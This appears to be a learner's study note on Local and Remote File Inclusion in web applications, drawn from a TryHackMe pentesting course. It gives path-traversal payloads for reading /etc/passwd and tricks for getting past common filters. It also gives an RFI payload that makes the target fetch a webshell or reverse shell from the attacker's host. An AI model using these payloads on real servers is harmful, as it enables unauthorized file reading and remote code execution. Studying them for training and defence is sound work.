Local and Remote File Inclusion vulnerabilities affect web servers with unsanitized inputs into a field used to select a specific file on a device. Good candidates for LFI/RFI are language fields, as these usually serve an entirely different webpage. 

Tools:
- [[Burp Suite]]
# LFI
To test, use the `..` operator to maneuver through the filesystem and select the information you are looking for. Ex: `?site=default&lang=../../../../../../../etc/passwd`. This example is for use in a URL, like in `www.example.com`. To try LFI, add the string above to the URL, like so:
`www.example.com?site=default&lang=../../../../../../etc/passwd`. ==Please DON'T try this on any actual website, including example.com, for obvious legal reasons.==

Methods exist of protecting against this attack that are also able to be bypassed. These include:
- Appending a suffix to the string provided; `/etc/passwd` becomes `/etc/passwd.php`
	- Defeated (before a current version of PHP) by appending `%00` to stop PHP processing the string before the suffix is reached. 
- Filtering out `../` sequences.
	- Defeated by building a string that works after the filter has been applied: `....//` -> `../`
- Forcing the request to select from the current directory; `www/`
	- Defeated by selecting from this directory first, and then traversing out; `www/../../../../../`
- Blacklisting special files; `/etc/passwd` disallowed
	- Defeated by path traversal again; `/etc/passwd` -> `/etc/passwd/.`
Some other vulnerabilities also include:
- Filtering only on one request type. For $\_REQUEST calls, the request can be made as either a GET or a POST, but one method may be filtered while the other is not.

# RFI
RFI is even more problematic, because it can lead to immediate RCE. If a web server is horribly misconfigured, the field can be used to point the file requestor method to an http(s) server serving the file. If the file is an executable format like PHP, a webshell or even reverse shell can be planted on the target host and executed from the browser.  Ex: `?site=default&lang=http://<my ip>/webshell.php`. 

*Even if a webshell cannot be uploaded and called into* we may still upload a 
PHP reverse shell and gain command execution on the web server.

RFI example from THM Jr Pentester Path:
![[Remote-File-Inclusion.png]]

Essentially, if a website allows us to choose files, we can trick it into sending a GET request to our machine or website. Then, the victim website will unwittingly execute our malicious file. 

For more information on File Inclusion vulnerabilities, see the TryHackMe Junior Pentester Path. In its' Intro to Web Hacking module, they have a room on File Inclusion vulnerabilities. 